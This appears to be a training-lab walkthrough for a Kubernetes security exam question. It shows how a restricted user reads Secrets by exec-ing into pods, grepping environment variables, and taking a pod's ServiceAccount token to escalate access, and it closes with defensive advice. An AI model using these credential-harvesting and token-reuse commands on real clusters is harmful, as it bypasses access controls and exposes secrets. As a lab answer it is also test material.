# Q12 — Hack Secrets (RBAC Permission Escape)

Find Secret values using the `restricted` context, which has limited permissions.

## Switch context

```bash
kubectl config use-context restricted@workload-prod
kubectl config current-context  # verify
```

## Investigate available permissions

```bash
# What can the restricted user do?
kubectl auth can-i --list -n restricted
kubectl auth can-i --list  # cluster-wide

# Key questions:
kubectl auth can-i get secrets -n restricted      # probably no
kubectl auth can-i list pods -n restricted        # maybe yes
kubectl auth can-i exec pods -n restricted        # maybe yes
```

## Strategy: find secrets through Pods

Secrets can be accessed without direct `get secret` permission if:
1. A Pod mounts the secret as a volume → exec into the Pod and read it
2. A Pod has the secret in env vars → exec and `env | grep`
3. A Pod's ServiceAccount token has more permissions → use it

```bash
# List pods in the restricted namespace
kubectl -n restricted get pods

# For each pod, check if it mounts our secrets
kubectl -n restricted get pod <pod-name> -o jsonpath='{.spec.volumes[*].secret.secretName}'
kubectl -n restricted get pod <pod-name> -o yaml | grep -A5 "secret\|env"

# Exec into a pod and read mounted secrets
kubectl -n restricted exec <pod-name> -- cat /path/to/mounted/secret
kubectl -n restricted exec <pod-name> -- env | grep -i "password\|secret"

# If the pod has a SA token with more permissions, use it
kubectl -n restricted exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(kubectl -n restricted exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl -n restricted get secret secret1 --token="$TOKEN"
```

## Extract password-key values

Once you can read each secret:

```bash
# Method 1: via exec into pod that mounts it
kubectl -n restricted exec <pod-name> -- cat /etc/secrets/password-key > /opt/course/12/secret1

# Method 2: via SA token with higher permissions
kubectl -n restricted get secret secret1 --token="$TOKEN" -o jsonpath='{.data.password-key}' | base64 -d > /opt/course/12/secret1

# Repeat for secret2, secret3
```

## Switch back

```bash
kubectl config use-context kubernetes-admin@kubernetes
kubectl config current-context  # verify
```

## Verification

```bash
cat /opt/course/12/secret1
cat /opt/course/12/secret2
cat /opt/course/12/secret3
```

## Key insight

This task demonstrates that RBAC "deny read secrets" is not sufficient if:
- Pods mount those secrets (exec access bypasses RBAC for secrets)
- ServiceAccount tokens have excessive permissions
- Secrets appear as environment variables (visible via exec)

Defense: also restrict `exec` on pods, and audit which pods mount which secrets.
